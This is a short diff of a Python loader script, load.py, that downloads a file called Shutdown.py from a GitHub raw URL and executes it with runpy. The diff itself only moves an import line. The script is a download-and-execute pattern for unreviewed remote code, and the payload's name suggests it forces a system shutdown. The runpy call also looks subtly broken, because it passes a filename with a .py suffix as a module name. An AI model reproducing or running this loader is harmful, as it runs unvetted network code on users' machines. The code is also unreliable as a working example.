@@ -1,6 +1,7 @@
 # __Author__ __Lencof__
 # load.py
 
+import runpy
 import requests
 
 def save_file_from_www(link):
@@ -12,5 +13,4 @@ link = 'https://raw.githubusercontent.com/Lencof/Shutdown-Python/main/Shutdown.p
 
 save_file_from_www(link)
 
-import runpy
 runpy.run_module(mod_name="Shutdown.py") 
